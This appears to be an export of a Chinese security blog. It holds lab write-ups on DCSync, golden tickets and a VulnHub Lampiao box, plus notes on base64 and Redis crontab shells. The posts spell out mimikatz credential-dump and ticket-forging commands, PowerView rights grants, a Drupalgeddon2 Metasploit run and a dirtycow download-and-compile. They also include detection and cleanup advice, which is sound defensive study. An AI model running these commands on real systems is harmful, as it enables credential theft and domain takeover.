<li>Administrators组内的用户</li>
<li>Enterprise Admins组内的用户</li>
<li>域控制器的计算机帐户</li>
</ul>
<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控复制用户凭据 ？？</p>
<p>实现代码：<a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</a></p>
<h2 id="维权方法："><a href="#维权方法：" class="headerlink" title="维权方法："></a>维权方法：</h2><ol>
<li><p>mimikatz</p>
<p>如上上篇博客所写</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导出所有用户hash</span></span><br><span class="line">lsadump::dcsync /domain:wlaq.com /all /csv</span><br><span class="line"><span class="comment">#导出administrator的hash</span></span><br><span class="line">lsadump::dcsync /domain:wlaq.com /user:administrator /csv</span><br></pre></td></tr></table></figure></li>
<li><p>powershell(对2012及以上不适用)</p>
<p>Invoke-DCSync:</p>
<p>\使用mimikatz的dcsync来收集域用户的hash,通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能</p>
<p><a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先更改powershell的执行策略</span></span><br><span class="line"><span class="built_in">set-executionpolicy</span> bypass <span class="literal">-scope</span> <span class="keyword">process</span></span><br><span class="line"><span class="comment">#导出域内所有用户的hash：</span></span><br><span class="line"><span class="built_in">Invoke-DCSync</span> <span class="literal">-DumpForest</span> | <span class="built_in">ft</span> <span class="literal">-wrap</span> <span class="literal">-autosize</span></span><br><span class="line"><span class="comment">#导出域内administrator帐户的hash：</span></span><br><span class="line"><span class="built_in">Invoke-DCSync</span> <span class="literal">-DumpForest</span> <span class="literal">-Users</span> <span class="selector-tag">@</span>(<span class="string">&quot;administrator&quot;</span>) | <span class="built_in">ft</span> <span class="literal">-wrap</span> <span class="literal">-autosize</span> </span><br></pre></td></tr></table></figure>

<p>powerview:</p>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270</a></p>
<p>利用powerview可向域内的一个普通用户添加如下三条ACE(Access Control Entries)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</span><br><span class="line">DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</span><br><span class="line">DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c) </span><br></pre></td></tr></table></figure>

<p>经过实验，添加前两条即可</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导入powerview</span></span><br><span class="line"><span class="built_in">import-module</span> .\Powerview.ps1</span><br><span class="line"><span class="comment">#向普通用户test添加上面三条ACE-acess control entries</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=wlaq,DC=com&quot;</span> <span class="literal">-PrincipalIdentity</span> test <span class="literal">-Rights</span> DCSync <span class="literal">-Verbose</span></span><br><span class="line"><span class="comment">#删除ACE命令</span></span><br><span class="line"><span class="built_in">Remove-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=wlaq,DC=com&quot;</span> <span class="literal">-PrincipalIdentity</span> test <span class="literal">-Rights</span> DCSync <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/1.png"></p>
<p>此时test用户即可利用DCSync来导出域内账户的hash,实现如下：</p>
</li>
</ol>
<h2 id="利用powerview获取用户权限"><a href="#利用powerview获取用户权限" class="headerlink" title="利用powerview获取用户权限"></a>利用powerview获取用户权限</h2><p>利用powerview向域内普通账户swanq添加三个访问控制项</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/1.png"></p>
<p>使用runas登录swanq账户</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/3.png"></p>
<p>使用mimikatz dump hash:</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/2.png"></p>
<h1 id="0x03检测及清理"><a href="#0x03检测及清理" class="headerlink" title="0x03检测及清理"></a>0x03检测及清理</h1><h2 id="检测："><a href="#检测：" class="headerlink" title="检测："></a><strong>检测：</strong></h2><p>注意windows事件：4662.</p>
<p>此时域成员与终端上都产生了两条ACE被添加的事件日志</p>
<h2 id="清理："><a href="#清理：" class="headerlink" title="清理："></a><strong>清理：</strong></h2><p>使用zbang自动化检测当前环境是否遭受dcsync攻击：ACLight -&gt;launch</p>
<p>ACLight可以检测出被添加DCSync权限的用户swanq</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/4.png"></p>
<h3 id="检测原理："><a href="#检测原理：" class="headerlink" title="检测原理："></a><strong>检测原理：</strong></h3><p><strong>枚举Active Directory中所有用户的ACL，标记出特权账户</strong></p>
<p>如果已被攻击，powerview清除ACE,参考0x02部分内容</p>
<h1 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h1><ol>
<li><p>Shadow Admin：具有高权限但不在高权限组的用户，如实验中的域用户swanq，查询高权限组的成员无法发现域内的Shadow Admin,但是zbang可以发现。</p>
</li>
<li><p>ACL和ACE的区别：</p>
<ul>
<li>Access Control Lists访问控制列表：<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists</a></li>
<li>Access Control Entities访问控制项：访问控制列表 (ACL) 中的条目。 ACE 包含一组访问权限和安全标识符 (SID) ，后者标识允许、拒绝或审核其权限的账户或登录会话。<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-entries">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-entries</a></li>
</ul>
<p>总结：ACL的多个ACE表示拥有不同访问权限的账户或登录会话。通过使用ACE的访问控制项来授予AD域服务中资源的访问权限</p>
</li>
<li><p>账户：</p>
<ul>
<li>用户账户可以登录到本机计算机</li>
<li>组用户不可</li>
</ul>
</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>主要参考：<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync</a></li>
<li>附属：<a href="https://blog.csdn.net/qq_41874930/article/details/111686683">https://blog.csdn.net/qq_41874930/article/details/111686683</a></li>
<li>工具：<a href="https://github.com/cyberark/zBang/releases/tag/v1.1">https://github.com/cyberark/zBang/releases/tag/v1.1</a></li>
<li><a href="https://www.youtube.com/watch?v=aSAZzIqGeiY">https://www.youtube.com/watch?v=aSAZzIqGeiY</a></li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>域渗透</tag>
        <tag>网络空间安全</tag>
        <tag>DCsync</tag>
      </tags>
  </entry>
  <entry>
    <title>feeling about internship</title>
    <url>/2021/07/07/feeling-about-internship/</url>
    <content><![CDATA[<p>听说，互联网公司兜兜转转的人很多</p>
<p>听说，我现在呆的地方是君哥和帅哥曾经呆过的地方</p>
<p>突然某日，他被挖了</p>
<p>突然今日，他 也要走了</p>
<p>无妨</p>
<p>江湖路远，来日再见</p>
<p>希望各位继续成长</p>
<p>我也在逐渐向大家看齐</p>
<p>希望等我长成与各位再见</p>
<p>那就熟悉奇安信的安全建设从零到一</p>
<p>那就熟悉各种原理及响应方式</p>
]]></content>
      <tags>
        <tag>思想生活</tag>
        <tag>安全建设</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透提权维权之金票</title>
    <url>/2021/07/05/%E9%87%91%E7%A5%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域内常用的两种攻击包括黄金票据Golden ticket和白银票据SILVER TICKET，本篇博客先来介绍一下金票</p>
<h1 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h1><table>
<thead>
<tr>
<th align="center">ROLE</th>
<th align="center">IP</th>
<th align="center">OS</th>
</tr>
</thead>
<tbody><tr>
<td align="center">DC域控</td>
<td align="center">10.xx.xx.xx</td>
<td align="center">2012</td>
</tr>
</tbody></table>
<p>条件：域名+域的SID+KRBTGT的NTLM-hash</p>
<h1 id="票据生成步骤："><a href="#票据生成步骤：" class="headerlink" title="票据生成步骤："></a>票据生成步骤：</h1><ol>
<li><p><strong>域名</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></li>
<li><p><strong>域的SID值</strong>     </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsyns /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/2.png"></p>
<blockquote>
<p>SID：500代表管理员</p>
</blockquote>
</li>
<li><p><strong>域的KRBTGT账户NTLM-HASH</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsyns /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure></li>
<li><p><strong>伪造任意域管账号</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user test password /add /domain</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="0x01-获取域SID及krbtgt的HTLM-hash"><a href="#0x01-获取域SID及krbtgt的HTLM-hash" class="headerlink" title="0x01.获取域SID及krbtgt的HTLM-hash"></a>0x01.获取域SID及krbtgt的HTLM-hash</h1><p>先在DC上新建一个实验用户swanq,此攻击都是基于在域控机子上的普通域内账户.即普通域内账户没有创建域管账户的权限或提升普通用户权限，而利用黄金票据可以做到</p>
<p>获取SID</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/1.jpg"></p>
<p>mimikatz获取域控SID及krbtgt的NTLMhash.可在域控或在登陆过域控账户的域成员上获取</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/3.png"></p>
<blockquote>
<p><strong>dcsync</strong></p>
<p>概述：mimikatz功能，可模拟DC域控并从DC中导出帐户密码的hash</p>
<p>详解：</p>
<ul>
<li><p>在dcsync出现之前，要想获得域用户的hash，必须得先登录域控+在域控上执行代码后才可以获得域用户的哈希。而mimikatz增加的dcsync功能，<strong>可以模仿域控从真实的域控当中请求数据</strong>。</p>
</li>
<li><p>dcsync特点在于不用登录服务器，就可以<strong>远程通过域数据同步复制的方式获得想要的用户口令。</strong></p>
</li>
</ul>
</blockquote>
<h1 id="0x02-伪造票据"><a href="#0x02-伪造票据" class="headerlink" title="0x02.伪造票据"></a>0x02.伪造票据</h1><p>在非域控的机子上，需要先清除本地票据缓存，但因此swanq用户刚创建且并未有其他服务需要票据，所以此处为空，不需要</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/12.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::purge   </span><br></pre></td></tr></table></figure>

<p>得到krbtgt hash后，用mimikatz的Kerberos::golden功能离线生成金票ticket.kiribi伪造TGT</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">kerberos::golden /user:swanq /domain:wlaq.com /sid:&#123;s<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-xxx</span>&#125;  /krbtgt:&#123;ntlm<span class="literal">-hash</span>&#125; /ticket:ticket.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/4.png"></p>
<h1 id="0x03-票据利用"><a href="#0x03-票据利用" class="headerlink" title="0x03.票据利用"></a>0x03.票据利用</h1><p>查看本地保存的票据,确认无误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/8.png"></p>
<p>或者klist也可</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/13.png"></p>
<p>将伪造的黄金票据导入内存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Kerberos::ptt ticket.kiribi</span><br></pre></td></tr></table></figure>

<p>此时可以直接将DC的C盘映射到本地h盘，进行访问，访问有两种方式：</p>
<p>其一</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/14.png"></p>
<p>其二</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/15.png"></p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/9.png"></p>
<p>入DC检查</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/16.png"></p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/17.png"></p>
<p>除了映射之外也可直接添加域管账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use username password &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure>

<p>入DC检查</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/10.png"></p>
<p>不过此域管账户并没有本地登录权限，还是需要加入administrator组</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/11.png"></p>
<h1 id="0x04-检测及清理"><a href="#0x04-检测及清理" class="headerlink" title="0x04.检测及清理"></a>0x04.检测及清理</h1><h2 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h2><ol>
<li>伪造自己是administrator，此时日志无法检测，但是可以检测是否在常用IP段出现。</li>
<li>用wireshark可以看到认证流程只有4769-&gt;4624</li>
</ol>
<h2 id="清理："><a href="#清理：" class="headerlink" title="清理："></a>清理：</h2><ol>
<li>即时修改krbtgt账号密码，且需修改两次以确保不保留密码历史记录</li>
<li>官方有重置密码的脚本，建议定期重置：<a href="https://github.com/microsoft/New-KrbtgtKeys.ps1">https://github.com/microsoft/New-KrbtgtKeys.ps1</a></li>
</ol>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><ol>
<li>正常的认证访问服务触发事件顺序为:<strong>4768（TGT）-4769（TGS）-4624（logon）</strong></li>
<li>mimikatz在win2003及以下导入黄金票据报错</li>
<li>事件4624-登录</li>
<li>事件4672-特殊登录：SYSTEM（本地系统）帐户的每次登录都会触发此事件,属正常事件</li>
<li>eventvwr打开windows事件查看器</li>
</ol>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>chz-大佬竟在我身边：<a href="https://zhuanlan.zhihu.com/p/385465988">https://zhuanlan.zhihu.com/p/385465988</a></li>
<li>域控是最高级，域管是任何被域控加入域管的域成员</li>
<li>新建域用户之后，需要给域用户配置隶属于管理员的权限，才允许本地登录：<a href="https://blog.csdn.net/weixin_43760829/article/details/89437363">https://blog.csdn.net/weixin_43760829/article/details/89437363</a></li>
<li>远程桌面命令行指令：mstsc(Microsoft Terminal Server Connection)</li>
<li>需要熟悉Active Directory 用户和计算机、组策略管理</li>
<li><a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C</a></li>
<li>存在错误但为主要参考：<a href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></li>
<li>mimikatz详情：<a href="https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html">https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html</a></li>
<li><a href="https://www.youtube.com/watch?v=f6SleGakcE0">https://www.youtube.com/watch?v=f6SleGakcE0</a></li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
        <tag>内网渗透</tag>
        <tag>黄金票据</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnHub靶机系列：Lampiao渗透Writeup</title>
    <url>/2021/07/02/vulnHub-Lampiao/</url>
    <content><![CDATA[<blockquote>
<p>Would you like to keep hacking in your own lab?</p>
<p>Try this brand new vulnerable machine! “Lampião 1”.</p>
<p>Get root!</p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本靶场目标：获取root权限</p>
<h1 id="0x01-靶机环境"><a href="#0x01-靶机环境" class="headerlink" title="0x01 靶机环境"></a>0x01 靶机环境</h1><p>靶机：GoldenEye 192.168.221.136</p>
<p>攻击机：kali 192.168.221.130</p>
<h1 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h1><h2 id="获取目标IP"><a href="#获取目标IP" class="headerlink" title="获取目标IP"></a>获取目标IP</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.221.0/24</span><br></pre></td></tr></table></figure>



<h2 id="服务扫描及信息收集"><a href="#服务扫描及信息收集" class="headerlink" title="服务扫描及信息收集"></a>服务扫描及信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -vv -p 1-65535 192.168.221.136</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/02/vulnHub-Lampiao/1.png"></p>
<p>22：ssh</p>
<p>80</p>
<p>1898：apache 2.4.7，此服务识别不了，直接返回数据</p>
<h1 id="0x03-漏洞探测及利用"><a href="#0x03-漏洞探测及利用" class="headerlink" title="0x03 漏洞探测及利用"></a>0x03 漏洞探测及利用</h1><p>访问1898端口为用户登录页面。dirb扫1898服务所有目录，发现敏感目录robots.txt</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/2.png"></p>
<p>robots.txt中记录了网站日志更改记录文件</p>
<h2 id="durpal"><a href="#durpal" class="headerlink" title="durpal"></a>durpal</h2><p>用durpal7的cms建站</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search dupral</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.221.136</span><br><span class="line"><span class="built_in">set</span> rport 1898</span><br><span class="line">exploit</span><br><span class="line"><span class="comment"># 直接拿下shell </span></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>

<p>但www-data权限较低</p>
<p>切换到/bin/bash目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以看到home路径下，<strong>用户名为tiago</strong></p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>网站一般有数据库的配置文件，在/var/www/html/sites/下有setting.php中写了数据库的用户名和密码</p>
<p>用户名：drupaluser</p>
<p>密码：Virgulino</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/database.png"></p>
<p>在users表中发现name和password。密码一般为md5加密，但并未查出来</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/users2.png"></p>
<h2 id="SSH访问服务器"><a href="#SSH访问服务器" class="headerlink" title="SSH访问服务器"></a>SSH访问服务器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh tiago@192.168.221.136</span><br></pre></td></tr></table></figure>

<p>以tiago身份登录服务器成功</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看靶机内核</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>考虑用16年的dirtycow提取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search </span><br><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40847.cpp &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/02/vulnHub-Lampiao/8.png"></p>
<p>靶机：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget  http:&#x2F;&#x2F;192.168.221.130&#x2F;40847.cpp</span><br><span class="line">chmod 777 40847.cpp</span><br><span class="line"></span><br><span class="line">g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">.&#x2F;dcow -s</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数解释：</p>
<ol>
<li>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</li>
<li>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告</li>
<li>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</li>
<li>-std=c++11就是用按C++2011标准来编译的</li>
<li>-pthread 在Linux中要用到多线程时，需要链接pthread库</li>
<li>-o dcow gcc生成的目标文件,名字为dcow</li>
</ol>
</blockquote>
<p><img src="/2021/07/02/vulnHub-Lampiao/12.png"></p>
<p>拿到flag</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/13.png"></p>
<h1 id="0x04-复盘"><a href="#0x04-复盘" class="headerlink" title="0x04 复盘"></a>0x04 复盘</h1><ul>
<li>其实一般流程就是信息收集：</li>
<li><ol>
<li>端口 服务，再者是网站的目录，获取普通权限。</li>
<li>获取使用的CMS或者中间件，去查找其对应的漏洞，然后上传exp，编译执行拿到一定权限。</li>
<li>进入bin/bash。查找网站配置文件，寻找数据库用户名密码登录拖库。</li>
<li>亦或者是ssh连接，然后用提权EXP进行提权，最终拿到root权限</li>
</ol>
</li>
<li>远程bash的上下左右键或者delete键键入会产生很奇怪的符号，敲代码的时候就很难受</li>
<li>脏牛提权脚本中有其如何执行的注释，之后的EXP记得看</li>
</ul>
<h1 id="0x05-todolist"><a href="#0x05-todolist" class="headerlink" title="0x05 todolist"></a>0x05 todolist</h1><ol>
<li>dirtycow漏洞具体原理</li>
<li>dupal漏洞的具体原理</li>
</ol>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>靶机地址：<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></li>
<li>文章参考：<a href="https://www.jianshu.com/p/ce319b350885?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">https://www.jianshu.com/p/ce319b350885?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></li>
</ol>
]]></content>
      <categories>
        <category>靶机Vulhub</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>CTF</tag>
        <tag>网络空间安全</tag>
        <tag>靶机渗透</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>base64解决terminal之间编码不同的问题</title>
    <url>/2021/07/01/base-64/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有些特殊字符没法以可打印字符的形式打印出来复制时，先编码一下，与url编码的原理相同</p>
<h1 id="使用及总结"><a href="#使用及总结" class="headerlink" title="使用及总结"></a>使用及总结</h1><p>使用：</p>
<p><img src="/2021/07/01/base-64/1.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@192: echo swanq &gt; 1</span><br><span class="line">root@192: echo circle &gt; 2</span><br><span class="line"></span><br><span class="line">root@192: diff -u 1 2 | base64 &gt; patch</span><br><span class="line"></span><br><span class="line">root@192: cat patch</span><br><span class="line">LS0tIDEJMjAyMS0wNy0wMSAyMjoyNDoxNy4wNzc3Mjc0MTAgKzA4MDAKKysrIDIJMjAyMS0wNy0wMSAyMjoyNDoyMy43OTc3Mjc2NzQgKzA4MDAKQEAgLTEgKzEgQEAKLXN3YW5xCitjaXJjbGUK</span><br><span class="line"></span><br><span class="line">root@192:&#x2F;home&#x2F;file# cat patch| base64 -d</span><br><span class="line">--- 1   2021-07-01 22:24:17.077727410 +0800</span><br><span class="line">+++ 2   2021-07-01 22:24:23.797727674 +0800</span><br><span class="line">@@ -1 +1 @@</span><br><span class="line">-swanq</span><br><span class="line">+circle</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/01/base-64/2.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以为base64会有什么神奇的功能，好吧，是我想多了…</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title>redis未授权写定时任务反弹shell出错解析</title>
    <url>/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第二次在总结redis未授权利用方式写crontab时，使用的是Ubuntu，发现反弹shell失败。然而第一次用CentOs时却没有此问题出现。特此刨根问底总结一下原因。</p>
<h1 id="0x01-cron服务和crontab命令"><a href="#0x01-cron服务和crontab命令" class="headerlink" title="0x01 cron服务和crontab命令"></a>0x01 cron服务和crontab命令</h1><h2 id="1-cron和crontab"><a href="#1-cron和crontab" class="headerlink" title="1.cron和crontab"></a>1.cron和crontab</h2><p>Linux存在需要定期执行的任务-例行性工作，分为用户设置的例行性任务和系统层面的例行性任务，其中：</p>
<ul>
<li>cron：执行计划命令的守护程序，会每分钟检查是否有任务需要执行</li>
<li>crontab：维护某用户crontab 文件的命令</li>
<li>cron 会查找/var/spool/cron/crontabs/ 目录下的文件及 /etc/crontab 文件中所有 crontab 命令，并读入内存中。</li>
</ul>
<p>具体crontab和cron用man自行查看</p>
<h2 id="2-ubuntu的cron程序位置"><a href="#2-ubuntu的cron程序位置" class="headerlink" title="2.ubuntu的cron程序位置"></a>2.ubuntu的cron程序位置</h2><p>ubuntu下可利用的cron包括：</p>
<ul>
<li><p>/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，前提是该任务计划文件的<strong>权限必须为600</strong></p>
</li>
<li><p>/etc/crontab：该文件里面的任务计划可直接执行，负责调度各种管理和维护任务</p>
</li>
<li><p>/etc/cron.d/*：存放任何要执行的crontab文件或脚本。该目录下任意文件都可被当作任务计划执行，且避免原先任务计划文件被覆盖</p>
</li>
<li><p>还可以把脚本放在其他目录，包括</p>
<p>/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p>
</li>
</ul>
<blockquote>
<p>/etc/crontab参数含义：</p>
<p>m:分钟 - 从0到59的整数 </p>
<p>h:小时 - 从0到23的整数 </p>
<p>dom:天 - 从1到31的整数 (必须是指定月份的有效日期) </p>
<p>mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份) </p>
<p>dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)</p>
<p>user:指的是执行命令的用户 </p>
<p>command: 需要执行的命令 </p>
<p><em>表示参数所有可用的值，如果为5个</em>，就代表每分钟执行一次 </p>
<p>/：指定步进设置。“/<interger>”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务</interger></p>
</blockquote>
<h1 id="0x02-查找原因"><a href="#0x02-查找原因" class="headerlink" title="0x02 查找原因"></a>0x02 查找原因</h1><p>查看/var/log/syslog可找到相关日志。因syslog记录系统所有日志信息。</p>
<p>1.写/var/spool/cron目录时</p>
<p>提示命令执行出现错误，ubuntu会将这些错误信息输出到ubuntu系统的邮件服务器，但是ubuntu系统默认没有安装邮件服务器，所以导致了错误</p>
<p>错误原因包括：</p>
<ol>
<li>/var/spool/cron/crontabs/权限不对劲，并非600</li>
<li>ubuntu的cron的shell环境为/bin/sh</li>
</ol>
<p>针对原因2可采用第二种方式：</p>
<p>2.写/etc/cron.d目录时</p>
<p>此时step1先更改/bin/sh为/bash,step2使用bash反弹shell。</p>
